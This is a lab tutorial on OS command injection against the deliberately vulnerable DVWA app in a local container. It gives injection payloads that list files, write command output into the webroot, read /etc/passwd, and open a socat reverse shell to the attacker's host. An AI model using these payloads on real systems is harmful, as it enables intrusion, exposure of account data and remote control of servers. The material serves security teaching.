## Get the DVWA up and running
Let’s pull up the Damn Vulnerable Web Application to see command injections in action! If it’s not already running, spin up Docker and the container:

```systemctl start docker```

```docker run --rm -it -p 80:80 vulnerables/web-dvwa```

Go through the steps to configure the app as we have done previously. Login with ```admin/admin```, configure the database, and log back in with ```admin/password```.

## Your first OS Command Injections
Go to “Command injection” in the left navigation. In the input field, type:

```; ls -a```

This lists out all the files and directories in your current, working directory. You could also type in an IP to ping before that semi-colon, but as you can see, at least on the low security level difficulty, it is not required. We can see where we are in the server using:

```; pwd```

Which returns this path:

```/var/www/html/vulnerabilities/exec```

Let’s pretend that we’re not getting any output, and so we’re not sure if our injections are working or not. One technique we can use to solve this problem is a time-based attack:

## Time-based attack
Type this in the input:

```; pwd; sleep 5```

You can see the application hanging for approximately 5 seconds, and so now you know that your sleep injection worked, which means the pwd also most likely worked.

Luckily, in this situation, we are able to see the output, and this output is telling us that the webroot for the app is at ```/var/www/html/```.

This is perfect, because while we could have tried to guess the web root directory since this is a standard, especially for apache, we’ve now confirmed it and we can use that to our advantage.

## Redirecting output
For example, if we want to figure out what user we are on the system, we could do that by redirecting the output from our command and create a text file with that output like we saw in the prior lesson:

```; whoami > /var/www/html/whoami.txt ;```

Then navigate to ```http://localhost/whoami.txt``` and you will see ```www-data```

Remember, this could also be a useful technique for blind injections since it lets us output data that we otherwise wouldn’t see. If we want to know the user ID, group ID, and group name, we can run this command:

```; echo "$(id)" > /var/www/html/whoami.txt ;```

We will see:

```uid=33(www-data) gid=33(www-data) groups=33(www-data)```

## Listing all users and attributes
If you’re familiar with Linux OS, you’ll be familiar with ```/etc/passwd```.

This is a plain text-based database that contains information for all user accounts on the system, so this would be a valuable file to try and expose. Let’s try that now:

```; cat /etc/passwd ;```

## Creating a reverse shell
Now, let’s kick it up a notch. Let’s see if we can’t create a reverse shell to connect to the server and run commands that way. I’m going to do this using a tool called socat which is fairly similar to netcat if you’re familiar with that. *On your host*, in this case Kali, we’re going to create a listener:

```socat file:`tty`,raw,echo=0 tcp-listen:1337```

Then, *on the server* (container in our case), we want to connect to that port. To do that, I first need to figure out the IP address that it will connect to:

```sudo ifconfig```

I’m looking for ```eth0```, and mine is: ```10.0.2.15```

Now that I have it, I can inject this command in the application:

```; socat tcp-connect:10.0.2.15:1337 exec:bash,pty,stderr,setsid,sigint```

At this point, our connection should be established, and we are now in the server.

```ls```

We could read through the source code of the application, which would undoubtably lead us to finding even more vulnerabilities, potentially some secrets, or potentially even modify the source code!

We can navigate around…for example, let’s go find our text file we created earlier:

```
cd /var/www/html
ls
cat whoami.txt
```

At this point, go ahead and have fun with the reverse shell since there’s a bunch of stuff you can do, and when you’re ready, I’ll see you in the next lesson!
